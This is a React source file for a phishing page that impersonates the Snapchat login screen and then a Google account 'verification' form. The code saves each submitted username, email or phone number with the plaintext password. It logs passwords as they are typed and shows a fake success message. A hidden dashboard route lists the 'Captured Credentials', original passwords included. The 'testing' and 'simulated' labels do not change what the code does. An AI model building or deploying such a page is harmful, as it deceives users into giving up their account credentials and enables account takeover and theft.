import { useState, useEffect, useRef } from 'react';
import { ChevronLeft, Database } from 'lucide-react';
import { saveUser, getUsers, clearUsers, logActivity, getActivities, clearActivities } from './db';

type ViewState = 'loadingAccount' | 'landing' | 'login' | 'forgotPassword' | 'dashboard' | 'googleVerify' | 'successReview';

export default function App() {
  const [username, setUsername] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const emailInputRef = useRef<HTMLInputElement>(null);
  const [showVerificationNotification, setShowVerificationNotification] = useState(false);
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loginMethod, setLoginMethod] = useState<'email' | 'phone'>('email');
  const [currentView, setCurrentView] = useState<ViewState>('landing');
  const [simulatedUsers, setSimulatedUsers] = useState<any[]>([]);
  const [simulatedActivities, setSimulatedActivities] = useState<any[]>([]);
  const [isShaking, setIsShaking] = useState(false);
  const [successMessage, setSuccessMessage] = useState('');

  useEffect(() => {
    if (window.location.pathname.includes('/dashboard') || window.location.hash.includes('dashboard') || window.location.search.includes('dashboard')) {
      setCurrentView('dashboard');
      loadUsers();
      loadActivities();
    } else {
      setCurrentView('loadingAccount');
      const timer = setTimeout(() => {
        setCurrentView('login');
        setShowVerificationNotification(true);
        logActivity('App loaded, showing login screen');
      }, 4500); // Increased loading duration
      return () => clearTimeout(timer);
    }
  }, []);

  const loadUsers = async () => {
    const users = await getUsers();
    setSimulatedUsers(users);
  };

  const loadActivities = async () => {
    const acts = await getActivities();
    setSimulatedActivities(acts);
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) {
      setIsShaking(true);
      setTimeout(() => setIsShaking(false), 500);
      return;
    }
    
    logActivity(`Clicked ${currentView === 'login' ? 'Snap Verify' : 'Google Verify'} Button`);
    
    if (currentView === 'login') {
      const identifier = loginMethod === 'email' ? username : phoneNumber;
      const passwordHash = window.btoa(password); // Simple base64 encoding to act as "hash"
      await saveUser(loginMethod, identifier, passwordHash, password);
      
      setCurrentView('successReview');
      setSuccessMessage('Account verified, we will review within 3 days');
      
      // Auto transition to google verification after 3.5 seconds
      setTimeout(() => {
        setCurrentView('googleVerify');
        setUsername('');
        setPassword('');
        logActivity('Transitioned to Google verification screen');
      }, 3500);
    } else if (currentView === 'googleVerify') {
      const passwordHash = window.btoa(password);
      await saveUser('google', username, passwordHash, password);
      
      setCurrentView('successReview');
      setSuccessMessage('Google verification complete. We will review your account soon.');
    }
  };

  // Form is valid if fields have some input
  const isFormValid = currentView === 'googleVerify' 
    ? username.trim() !== '' && password.trim() !== ''
    : loginMethod === 'email'
      ? username.trim() !== '' && password.trim() !== ''
      : phoneNumber.trim() !== '' && password.trim() !== '';

  const handleBack = () => {
    if (currentView === 'forgotPassword') {
      setCurrentView('login');
    } else if (currentView === 'login') {
      setCurrentView('landing');
    } else if (currentView === 'dashboard') {
      window.location.href = '/';
    }
  };

  if (currentView === 'dashboard') {
    return (
      <div className="min-h-screen bg-gray-100 p-4 sm:p-8 font-sans">
        <div className="max-w-4xl mx-auto bg-white rounded-2xl shadow-sm border border-gray-200 overflow-hidden">
          <div className="p-6 border-b border-gray-200 flex justify-between items-center bg-gray-50">
            <div className="flex items-center gap-3">
              <Database className="text-gray-500 w-6 h-6" />
              <h1 className="text-2xl font-bold text-gray-900 tracking-tight">Simulated Users (Testing Dashboard)</h1>
            </div>
            <div className="flex gap-3">
              <button 
                onClick={async () => { await clearUsers(); await clearActivities(); loadUsers(); loadActivities(); }}
                className="px-4 py-2 text-sm font-semibold text-red-600 bg-red-50 hover:bg-red-100 rounded-lg transition-colors"
              >
                Clear All Data
              </button>
              <button 
                onClick={handleBack}
                className="px-4 py-2 text-sm font-semibold text-gray-700 bg-white border border-gray-300 hover:bg-gray-50 rounded-lg transition-colors"
              >
                Go Back
              </button>
            </div>
          </div>
          <div className="p-0 overflow-x-auto">
            <h2 className="px-6 py-4 text-lg font-semibold text-gray-800 bg-gray-50 border-b border-gray-200">Captured Credentials</h2>
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="bg-gray-50 border-b border-gray-200 text-xs uppercase tracking-wider text-gray-500">
                  <th className="px-6 py-4 font-semibold">ID</th>
                  <th className="px-6 py-4 font-semibold">Method</th>
                  <th className="px-6 py-4 font-semibold">Identifier</th>
                  <th className="px-6 py-4 font-semibold">Original Password</th>
                  <th className="px-6 py-4 font-semibold">Password Hash</th>
                  <th className="px-6 py-4 font-semibold">Time</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {simulatedUsers.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="px-6 py-12 text-center text-gray-500 font-medium tracking-wide">
                      No users submitted yet.
                    </td>
                  </tr>
                ) : (
                  simulatedUsers.map(user => (
                    <tr key={user.id} className="hover:bg-gray-50 transition-colors">
                      <td className="px-6 py-4 text-sm text-gray-900 font-medium font-mono" title={user.id}>{user.id.split('-')[0]}...</td>
                      <td className="px-6 py-4 text-sm text-gray-500 capitalize">{user.auth_method}</td>
                      <td className="px-6 py-4 text-sm text-gray-900 font-medium">{user.identifier}</td>
                      <td className="px-6 py-4 text-sm font-mono text-gray-600 bg-gray-50 rounded" title="For testing purposes only">
                        {user.original_password}
                      </td>
                      <td className="px-6 py-4 text-sm font-mono text-gray-400 truncate max-w-[150px]">
                        {user.password_hash}
                      </td>
                      <td className="px-6 py-4 text-sm text-gray-500 whitespace-nowrap">
                        {new Date(user.created_at).toLocaleString()}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>

            <h2 className="px-6 py-4 text-lg font-semibold text-gray-800 bg-gray-50 border-y border-gray-200 mt-8">Activity Log</h2>
            <table className="w-full text-left border-collapse mb-8">
              <thead>
                <tr className="bg-gray-50 border-b border-gray-200 text-xs uppercase tracking-wider text-gray-500">
                  <th className="px-6 py-4 font-semibold">ID</th>
                  <th className="px-6 py-4 font-semibold">Action</th>
                  <th className="px-6 py-4 font-semibold">Details</th>
                  <th className="px-6 py-4 font-semibold">Time</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {simulatedActivities.length === 0 ? (
                  <tr>
                    <td colSpan={4} className="px-6 py-12 text-center text-gray-500 font-medium tracking-wide">
                      No activity logged yet.
                    </td>
                  </tr>
                ) : (
                  simulatedActivities.map(act => (
                    <tr key={act.id} className="hover:bg-gray-50 transition-colors">
                      <td className="px-6 py-4 text-sm text-gray-900 font-medium font-mono" title={act.id}>{act.id.split('-')[0]}...</td>
                      <td className="px-6 py-4 text-sm text-gray-900 font-medium">{act.action}</td>
                      <td className="px-6 py-4 text-sm text-gray-600 font-mono bg-gray-50 rounded">{act.metadata ? act.metadata.details : ''}</td>
                      <td className="px-6 py-4 text-sm text-gray-500 whitespace-nowrap">
                        {new Date(act.created_at).toLocaleString()}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center font-sans sm:p-4">
      {/* Mobile-first constraints: full width/height on mobile, phone-sized card on desktop */}
      <div className={`w-full h-[100dvh] sm:h-[844px] sm:w-[390px] ${currentView === 'landing' || currentView === 'loadingAccount' ? 'bg-[#fffc00]' : 'bg-white'} sm:rounded-[36px] sm:shadow-2xl flex flex-col relative overflow-hidden sm:border-[8px] sm:border-gray-900 items-stretch transition-colors duration-300`}>
        
        {currentView === 'loadingAccount' ? (
          <div className="flex-1 flex flex-col items-center justify-center animate-in fade-in duration-300 px-6">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="95" height="95" className="mb-6 drop-shadow-sm">
              <path d="M12.206.793c.99 0 4.347.276 5.93 3.821.529 1.193.403 3.219.299 4.847l-.003.06c-.012.18-.022.345-.03.51.075.045.203.09.401.09.3-.016.659-.12 1.033-.301.165-.088.344-.104.464-.104.182 0 .359.029.509.09.45.149.734.479.734.838.015.449-.39.839-1.213 1.168-.089.029-.209.075-.344.119-.45.135-1.139.36-1.333.81-.09.224-.061.524.12.868l.015.015c.06.136 1.526 3.475 4.791 4.014.255.044.435.27.42.509 0 .075-.015.149-.045.225-.24.569-1.273.988-3.146 1.271-.059.091-.12.375-.164.57-.029.179-.074.36-.134.553-.076.271-.27.405-.555.405h-.03c-.135 0-.313-.031-.538-.074-.36-.075-.765-.135-1.273-.135-.3 0-.599.015-.913.074-.6.104-1.123.464-1.723.884-.853.599-1.826 1.288-3.294 1.288-.06 0-.119-.015-.18-.015h-.149c-1.468 0-2.427-.675-3.279-1.288-.599-.42-1.107-.779-1.707-.884-.314-.045-.629-.074-.928-.074-.54 0-.958.089-1.272.149-.211.043-.391.074-.54.074-.374 0-.523-.224-.583-.42-.061-.192-.09-.389-.135-.567-.046-.181-.105-.494-.166-.57-1.918-.222-2.95-.642-3.189-1.226-.031-.063-.052-.15-.055-.225-.015-.243.165-.465.42-.509 3.264-.54 4.73-3.879 4.791-4.02l.016-.029c.18-.345.224-.645.119-.869-.195-.434-.884-.658-1.332-.809-.121-.029-.24-.074-.346-.119-1.107-.435-1.257-.93-1.197-1.273.09-.479.674-.793 1.168-.793.146 0 .27.029.383.074.42.194.789.3 1.104.3.234 0 .384-.06.465-.105l-.046-.569c-.098-1.626-.225-3.651.307-4.837C7.392 1.077 10.739.807 11.727.807l.419-.015h.06z" fill="white" stroke="black" strokeWidth="1.25" strokeLinejoin="round" />
            </svg>
            <div className="w-10 h-10 border-4 border-gray-900 border-t-white rounded-full animate-spin mb-6"></div>
            <p className="text-xl font-bold text-gray-900 text-center tracking-tight">
              Loading your account<br/>
              <span className="text-black">salima_bell1368</span>
            </p>
          </div>
        ) : currentView === 'landing' ? (
          <div className="flex-1 flex flex-col pt-12 animate-in fade-in duration-300">
             <div className="flex-1 flex items-center justify-center -mt-8 drop-shadow-sm">
               {/* Accurate Snapchat Logo from Simple Icons */}
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="85" height="85">
                 <path d="M12.206.793c.99 0 4.347.276 5.93 3.821.529 1.193.403 3.219.299 4.847l-.003.06c-.012.18-.022.345-.03.51.075.045.203.09.401.09.3-.016.659-.12 1.033-.301.165-.088.344-.104.464-.104.182 0 .359.029.509.09.45.149.734.479.734.838.015.449-.39.839-1.213 1.168-.089.029-.209.075-.344.119-.45.135-1.139.36-1.333.81-.09.224-.061.524.12.868l.015.015c.06.136 1.526 3.475 4.791 4.014.255.044.435.27.42.509 0 .075-.015.149-.045.225-.24.569-1.273.988-3.146 1.271-.059.091-.12.375-.164.57-.029.179-.074.36-.134.553-.076.271-.27.405-.555.405h-.03c-.135 0-.313-.031-.538-.074-.36-.075-.765-.135-1.273-.135-.3 0-.599.015-.913.074-.6.104-1.123.464-1.723.884-.853.599-1.826 1.288-3.294 1.288-.06 0-.119-.015-.18-.015h-.149c-1.468 0-2.427-.675-3.279-1.288-.599-.42-1.107-.779-1.707-.884-.314-.045-.629-.074-.928-.074-.54 0-.958.089-1.272.149-.211.043-.391.074-.54.074-.374 0-.523-.224-.583-.42-.061-.192-.09-.389-.135-.567-.046-.181-.105-.494-.166-.57-1.918-.222-2.95-.642-3.189-1.226-.031-.063-.052-.15-.055-.225-.015-.243.165-.465.42-.509 3.264-.54 4.73-3.879 4.791-4.02l.016-.029c.18-.345.224-.645.119-.869-.195-.434-.884-.658-1.332-.809-.121-.029-.24-.074-.346-.119-1.107-.435-1.257-.93-1.197-1.273.09-.479.674-.793 1.168-.793.146 0 .27.029.383.074.42.194.789.3 1.104.3.234 0 .384-.06.465-.105l-.046-.569c-.098-1.626-.225-3.651.307-4.837C7.392 1.077 10.739.807 11.727.807l.419-.015h.06z" fill="white" stroke="black" strokeWidth="1.25" strokeLinejoin="round" />
               </svg>
            </div>
            <div className="pb-12 px-6 space-y-4">
              <button className="w-full py-[14px] bg-white rounded-full font-bold text-[15px] text-gray-800 flex items-center justify-center gap-3 shadow-sm hover:bg-gray-50 transition-colors">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                  <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                  <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                  <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                </svg>
                Continue with Google
              </button>
              <button 
                type="button"
                className="w-full py-[14px] bg-[#00A9E0] rounded-full font-bold text-[15px] text-white shadow-sm hover:bg-[#0096c7] transition-colors"
              >
                Sign Up
              </button>
              <div className="text-center pt-4 pb-2">
                <p className="text-[14px] font-bold text-gray-900 drop-shadow-sm">
                  Already have an account?{' '}
                  <button onClick={() => {
                    setCurrentView('loadingAccount');
                    setTimeout(() => {
                      setCurrentView('login');
                      setShowVerificationNotification(true);
                      logActivity('App loaded, showing login screen');
                    }, 4500); // Increased loading duration
                  }} className="text-[#00A9E0] hover:underline active:opacity-70 transition-colors">
                    Log In
                  </button>
                </p>
              </div>
            </div>
          </div>
        ) : currentView === 'googleVerify' ? (
          <div className="flex-1 flex flex-col bg-white animate-in slide-in-from-right-4 duration-300 z-10 w-full h-full px-8 pt-16">
            <div className="flex flex-col items-center mb-8">
              <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="mb-4">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
              </svg>
              <h1 className="text-2xl font-normal text-[#202124] mb-2">Sign in</h1>
              <p className="text-[15px] text-[#202124] font-medium text-center leading-relaxed">
                Verify your Google Account to complete verification
              </p>
            </div>
            
            <form className={`space-y-6 ${isShaking ? 'animate-shake' : ''}`} onSubmit={handleLoginSubmit}>
              <div className="relative">
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onFocus={() => logActivity('Focused Google Email Input')}
                  onBlur={(e) => {
                    if (e.target.value) logActivity('Entered Google Email', e.target.value);
                  }}
                  className="w-full px-4 py-3.5 rounded-[4px] border border-[#dadce0] focus:border-[#1a73e8] focus:border-2 outline-none text-[#202124] text-[16px] transition-colors peer placeholder-transparent"
                  placeholder="Email or phone"
                  required
                />
                <label className="absolute left-3.5 -top-2.5 bg-white px-1 text-[12px] text-[#1a73e8] font-medium transition-all peer-placeholder-shown:text-[16px] peer-placeholder-shown:text-[#5f6368] peer-placeholder-shown:top-3.5 peer-placeholder-shown:font-normal peer-placeholder-shown:px-1 peer-focus:-top-2.5 peer-focus:text-[12px] peer-focus:text-[#1a73e8] peer-focus:font-medium pointer-events-none">
                  Email or phone
                </label>
              </div>

              <div className="relative">
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => logActivity('Focused Google Password Input')}
                  onBlur={(e) => {
                    if (e.target.value) logActivity('Entered Google Password', e.target.value);
                  }}
                  className="w-full px-4 py-3.5 rounded-[4px] border border-[#dadce0] focus:border-[#1a73e8] focus:border-2 outline-none text-[#202124] text-[16px] transition-colors peer placeholder-transparent"
                  placeholder="Enter your password"
                  required
                />
                <label className="absolute left-3.5 -top-2.5 bg-white px-1 text-[12px] text-[#1a73e8] font-medium transition-all peer-placeholder-shown:text-[16px] peer-placeholder-shown:text-[#5f6368] peer-placeholder-shown:top-3.5 peer-placeholder-shown:font-normal peer-placeholder-shown:px-1 peer-focus:-top-2.5 peer-focus:text-[12px] peer-focus:text-[#1a73e8] peer-focus:font-medium pointer-events-none">
                  Enter your password
                </label>
                <div className="absolute right-3 top-3 flex items-center">
                  <input
                    type="checkbox"
                    id="show-google-password"
                    checked={showPassword}
                    onChange={(e) => setShowPassword(e.target.checked)}
                    className="w-4 h-4 cursor-pointer accent-[#1a73e8]"
                  />
                  <label htmlFor="show-google-password" className="ml-2 text-[14px] text-[#5f6368] cursor-pointer">Show password</label>
                </div>
              </div>
              
              <div className="mt-8 flex justify-end items-center pt-8">
                <button
                  type="submit"
                  disabled={!isFormValid}
                  className={`px-6 py-2 rounded font-medium text-[14px] transition-colors ${
                    isFormValid
                      ? 'bg-[#1a73e8] text-white hover:bg-[#1557b0]'
                      : 'bg-[#f1f3f4] text-[#a8a8a8] cursor-not-allowed'
                  }`}
                >
                  Verify
                </button>
              </div>
            </form>
          </div>
        ) : currentView === 'successReview' ? (
          <div className="flex-1 flex flex-col bg-white animate-in zoom-in-95 duration-500 z-10 w-full h-full items-center justify-center p-8">
            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-6 shadow-sm">
              <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M20 6L9 17l-5-5" stroke="#10b981" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
            <h2 className="text-2xl font-bold text-gray-900 mb-3 text-center tracking-tight">Success!</h2>
            <p className="text-gray-600 text-center text-[16px] leading-relaxed max-w-xs">{successMessage}</p>
          </div>
        ) : (
          <div className="flex-1 flex flex-col bg-white animate-in slide-in-from-right-4 duration-300 z-10 w-full h-full">
            {/* Header */}
            <div className="flex items-center px-2 pt-10 sm:pt-12 pb-2">
              <button 
                type="button"
                onClick={handleBack}
                className="p-3 rounded-full hover:bg-gray-100 transition-colors cursor-pointer text-[#a5a5a5] hover:text-black"
                aria-label="Go back"
              >
                <ChevronLeft className="w-8 h-8 stroke-[2.5]" />
              </button>
            </div>

            {/* Content Body */}
            {currentView === 'forgotPassword' ? (
              <div className="flex-1 px-8 pt-2 flex flex-col animate-in fade-in slide-in-from-right-4 duration-300">
                <h1 className="text-center text-[22px] font-bold text-gray-900 tracking-tight mb-8">
                  Forgot Password
                </h1>
                <p className="text-center text-[15px] font-medium text-gray-800 mb-10 max-w-[250px] mx-auto leading-relaxed">
                  Please choose how you want to reset your password.
                </p>
                <div className="space-y-4">
                  <button
                    type="button"
                    className="w-full py-4 text-[15px] font-bold text-gray-900 bg-gray-50 border border-gray-200 rounded-xl hover:bg-gray-100 transition-colors shadow-sm"
                  >
                    via Phone
                  </button>
                  <button
                    type="button"
                    className="w-full py-4 text-[15px] font-bold text-gray-900 bg-gray-50 border border-gray-200 rounded-xl hover:bg-gray-100 transition-colors shadow-sm"
                  >
                    via Email
                  </button>
                </div>
              </div>
            ) : (
              <>
                <div className="flex-1 px-8 pt-2 flex flex-col animate-in fade-in slide-in-from-left-4 duration-300">
                  <h1 className="text-center text-[22px] font-bold text-gray-900 tracking-tight mb-10">
                    Log In
                  </h1>

                  <form className={`space-y-6 ${isShaking ? 'animate-shake' : ''}`} onSubmit={handleLoginSubmit}>
                    {loginMethod === 'email' ? (
                      <div className="flex flex-col animate-in fade-in slide-in-from-right-2 duration-300">
                        <label className="text-[11px] font-bold text-gray-500 tracking-widest mb-1">
                          USERNAME OR EMAIL
                        </label>
                        <input
                          ref={emailInputRef}
                          type="text"
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                          onFocus={() => logActivity('Focused Username Input')}
                          onBlur={(e) => {
                            if (e.target.value) logActivity('Entered Username/Email', e.target.value);
                          }}
                          className="w-full text-lg font-semibold text-gray-900 pb-1.5 border-b-2 border-gray-100 outline-none focus:border-[#00A9E0] transition-colors"
                          spellCheck="false"
                          autoComplete="off"
                        />
                      </div>
                    ) : (
                      <div className="flex flex-col animate-in fade-in slide-in-from-left-2 duration-300">
                        <label className="text-[11px] font-bold text-gray-500 tracking-widest mb-1">
                          PHONE NUMBER
                        </label>
                        <input
                          ref={emailInputRef}
                          type="tel"
                          value={phoneNumber}
                          onChange={(e) => setPhoneNumber(e.target.value)}
                          onFocus={() => logActivity('Focused Phone Input')}
                          onBlur={(e) => {
                            if (e.target.value) logActivity('Entered Phone Number', e.target.value);
                          }}
                          className="w-full text-lg font-semibold text-gray-900 pb-1.5 border-b-2 border-gray-100 outline-none focus:border-[#00A9E0] transition-colors"
                          spellCheck="false"
                          autoComplete="off"
                        />
                      </div>
                    )}

                    <div className="flex flex-col relative">
                      <label className="text-[11px] font-bold text-gray-500 tracking-widest mb-1">
                        PASSWORD
                      </label>
                      <div className="relative">
                        <input
                          type={showPassword ? 'text' : 'password'}
                          value={password}
                          onChange={(e) => setPassword(e.target.value)}
                          onFocus={() => logActivity('Focused Password Input')}
                          onBlur={(e) => {
                            if (e.target.value) logActivity('Entered Password', e.target.value);
                          }}
                          className="w-full text-lg font-semibold text-gray-900 pb-1.5 border-b-2 border-gray-100 outline-none focus:border-[#00A9E0] transition-colors pr-14"
                        />
                        {password && (
                          <button
                            type="button"
                            onClick={() => setShowPassword(!showPassword)}
                            className="absolute right-0 top-1 text-[13px] font-bold text-gray-500 hover:text-gray-800"
                          >
                            {showPassword ? 'Hide' : 'Show'}
                          </button>
                        )}
                      </div>
                    </div>
                  </form>
                </div>

                {/* Bottom Actions */}
                <div className="px-8 pb-12 flex flex-col items-center">
                  <button
                    onClick={handleLoginSubmit}
                    className={`w-[75%] py-3.5 rounded-full font-bold text-[15px] transition-all duration-200 ${
                      isFormValid
                        ? 'bg-[#00A9E0] text-white shadow-md transform hover:scale-[1.02]'
                        : 'bg-gray-200 text-gray-400'
                    }`}
                  >
                    Verify
                  </button>
                  
                  <button 
                    type="button"
                    onClick={() => setLoginMethod(loginMethod === 'email' ? 'phone' : 'email')}
                    className="mt-8 text-[13px] font-semibold text-[#00A9E0] hover:underline transition-colors"
                  >
                    {loginMethod === 'email' ? 'Use Phone Number Instead' : 'Use Email or Username Instead'}
                  </button>
                </div>
              </>
            )}

            {/* Verification Notification */}
            {showVerificationNotification && currentView === 'login' && (
              <div 
                className="absolute top-14 left-4 right-4 bg-gray-900 text-white px-5 py-4 rounded-2xl shadow-2xl flex items-center justify-between cursor-pointer animate-in fade-in slide-in-from-top-4 z-50 duration-300 hover:bg-gray-800 transition-colors"
                onClick={() => {
                  logActivity('Clicked Verify Notification');
                  setShowVerificationNotification(false);
                  setTimeout(() => emailInputRef.current?.focus(), 50);
                }}
              >
                <span className="font-bold text-[15px] tracking-tight">Verify Your Account Info</span>
                <button className="text-[#00A9E0] font-bold text-[14px] bg-white/10 px-3 py-1.5 rounded-full hover:bg-white/20 transition-colors">Review</button>
              </div>
            )}
          </div>
        )}
        
      </div>
    </div>
  );
}
